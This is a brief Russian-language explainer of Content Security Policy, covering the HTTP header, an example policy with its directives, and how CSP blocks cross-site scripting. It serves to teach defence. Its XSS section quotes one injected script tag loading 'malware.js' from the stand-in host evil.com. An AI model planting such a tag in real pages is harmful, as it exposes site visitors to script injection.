# CSP (Content Security Policy)

**CSP (Политика защиты контента)** — это дополнительный уровень безопасности, который помогает обнаруживать и смягчать определенные виды атак, включая Cross-Site Scripting (XSS) и атаки с внедрением данных. 

CSP работает путем ограничения источников (доменов), из которых браузеру разрешено загружать исполняемые скрипты, стили, изображения, шрифты и другие ресурсы для конкретной страницы.

## Как это работает?

Веб-сервер отправляет специальный HTTP-заголовок `Content-Security-Policy` вместе с ответом.

Пример заголовка:
```http
Content-Security-Policy: default-src 'self'; img-src *; media-src example.org example.net; script-src userscripts.example.com
```

### Разбор примера:
- `default-src 'self'`: По умолчанию все ресурсы (скрипты, стили, шрифты) могут загружаться только с того же домена, что и сама страница (`self`).
- `img-src *`: Картинки можно загружать откуда угодно.
- `media-src example.org example.net`: Аудио и видео только с этих двух доменов.
- `script-src userscripts.example.com`: Исполняемые скрипты только с указанного домена. Никаких инлайн-скриптов (`<script>...</script>`) или `eval()` не разрешено.

## Основные директивы:
- `script-src`: Определяет разрешенные источники для JavaScript.
- `style-src`: Для CSS стилей.
- `img-src`: Для изображений.
- `connect-src`: Ограничивает URL, к которым можно обращаться через `fetch`, `XMLHttpRequest`, WebSockets.
- `font-src`: Для веб-шрифтов.
- `frame-src`: Для `<frame>` и `<iframe>`.

## Защита от XSS
Главное преимущество CSP — защита от XSS. Если злоумышленник сможет внедрить тег `<script src="http://evil.com/malware.js"></script>` в HTML страницы, браузер **откажется** загружать и выполнять этот скрипт, так как домен `evil.com` не разрешен в политике `script-src`.
